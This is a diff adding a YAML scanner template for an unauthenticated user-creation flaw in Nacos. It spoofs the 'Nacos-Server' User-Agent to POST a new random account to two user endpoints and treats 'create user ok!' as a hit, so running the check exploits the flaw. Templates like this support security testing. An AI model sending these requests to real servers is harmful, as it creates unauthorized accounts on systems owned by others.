@@ -1,0 +1,28 @@
+id: nacos-create-user-unauthorized
+
+info:
+  name: Nacos Unauthorized Create User
+  author: zan8in
+  severity: high
+  verified: true
+  description: fofa app="NACOS"
+
+set:
+    r1: randomLowercase(8)
+    r2: randomLowercase(8)
+rules:
+  r0:
+    request:
+        method: POST
+        path: /nacos/v1/auth/users?username={{r1}}&password={{r2}}
+        headers:
+          User-Agent: Nacos-Server
+    expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
+  r1:
+    request:
+        method: POST
+        path: /v1/auth/users?username={{r1}}&password={{r2}}
+        headers:
+          User-Agent: Nacos-Server
+    expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
+expression: r0() || r1()
